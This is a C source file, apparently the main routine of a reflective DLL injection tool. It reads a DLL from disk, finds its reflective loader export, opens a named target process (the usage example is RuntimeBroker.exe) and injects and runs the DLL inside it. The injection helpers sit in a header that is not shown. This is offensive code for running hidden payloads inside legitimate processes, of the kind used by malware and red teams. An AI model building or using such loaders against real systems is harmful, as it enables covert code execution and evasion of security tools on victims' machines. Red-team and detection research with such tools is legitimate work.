#include "Reflective-Inject.h"


#define GET_FILENAME(path)				(wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path)

BOOL FetchArguments(IN WCHAR* Argv[], IN INT Argc, OUT WCHAR** ppcReflectiveDllName, OUT WCHAR** ppcTargetProcessName) {

	for (int i = 1; i < Argc - 1; i++) {
		if (wcscmp(Argv[i], L"-rfldll") == 0)
			*ppcReflectiveDllName = Argv[i + 1];
		else if (wcscmp(Argv[i], L"-p") == 0)
			*ppcTargetProcessName = Argv[i + 1];
	}

	return (*ppcReflectiveDllName != NULL && *ppcTargetProcessName != NULL) ? TRUE : FALSE;
}


int wmain(int argc, wchar_t* argv[]) {
	
	PBYTE	pRflDllBuffer = NULL;
	DWORD	dwRflDllSize = 0x00;
	DWORD	dwRflFuncOffset = 0x00;

	DWORD	dwProcessId = 0x00;
	HANDLE	hTargetProcess = NULL;

	PWCHAR pcReflectiveDllName = NULL;
	PWCHAR pcTargetProcessName = NULL;


	if (argc != 5 || !FetchArguments(argv, argc, &pcReflectiveDllName, &pcTargetProcessName)) {

		printf("[!] Usage: %ws -rfldll <Reflective DLL Path> -p <Target Process Name>\n", GET_FILENAME(argv[0]));
		printf("\t>>> Example: %ws -rfldll ReflectiveDllLdr.dll -p RuntimeBroker.exe \n\n", GET_FILENAME(argv[0]));
		return -1;
	}

	if (!ReadReflectiveDll(pcReflectiveDllName, &pRflDllBuffer, &dwRflDllSize))
		return -1;

	if (!(dwRflFuncOffset = GetReflectiveFunctionOffset(pRflDllBuffer)))
		return -1;

	printf("[*] Found %s's Offset At: 0x%0.8X \n", EXPORTED_FUNC_NAME, dwRflFuncOffset);

	printf("[i] Getting %ws's PID ... ", pcTargetProcessName);

	if (!GetRemoteProcessHandle(pcTargetProcessName, &dwProcessId, &hTargetProcess))
		return -1;

	printf("[*] Found %ws's PID: %d \n", pcTargetProcessName, dwProcessId);

	if (!InjectAndRunRflDll(hTargetProcess, dwRflFuncOffset, pRflDllBuffer, dwRflDllSize))
		return -1;
	printf("[+] DONE \n");


	return 0;
}